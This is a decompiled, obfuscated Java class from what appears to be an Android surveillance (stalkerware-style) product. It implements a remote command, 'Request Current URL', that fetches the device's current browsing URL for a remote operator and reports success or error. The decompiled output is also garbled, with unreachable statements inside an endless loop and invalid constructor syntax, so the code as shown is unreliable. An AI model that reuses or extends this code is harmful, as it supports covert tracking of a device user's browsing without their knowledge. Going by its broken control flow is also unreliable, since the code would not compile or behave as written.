package com.vvt.remotecommand.processor.h;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = h();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.SEND_CURRENT_URL;
    boolean bool2 = false;
    ((ControlCommand)localObject2).<init>(localRemoteFunction, null);
    int i = a;
    if (i != 0) {}
    localObject2 = ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
    bool1 = a;
    if ((!bool1) || (paramc != null))
    {
      bool1 = localObject2 instanceof RmtCtrlOutputStatusMessage;
      if (bool1)
      {
        localObject1 = localObject2;
        localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
        i = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        bool2 = a;
        if ((!bool2) || (i != 0))
        {
          localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
          paramc.b(paramRemoteCommand, this, (String)localObject1);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
      if (localObject1 != null)
      {
        int j = ((String)localObject1).length();
        i = 1;
        if (j > i)
        {
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      continue;
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      continue;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Request Current URL";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/AppEngine1/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */